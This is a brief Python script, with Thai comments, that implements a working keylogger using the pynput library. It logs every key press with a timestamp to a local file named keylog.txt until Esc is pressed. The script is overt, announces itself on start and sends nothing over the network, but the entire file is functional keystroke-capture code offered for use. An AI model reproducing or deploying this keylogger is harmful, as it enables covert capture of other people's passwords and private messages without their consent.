from pynput import keyboard # pip install pynput
import logging
import os
import time

# ตั้งค่าการบันทึก
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key {key.char}')
    except AttributeError:
        logging.info(f'Special key {key}')

def on_release(key):
    if key == keyboard.Key.esc:  # กด Esc เพื่อหยุด Keylogger
        return False

if __name__ == "__main__":
    print("Keylogger started! Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
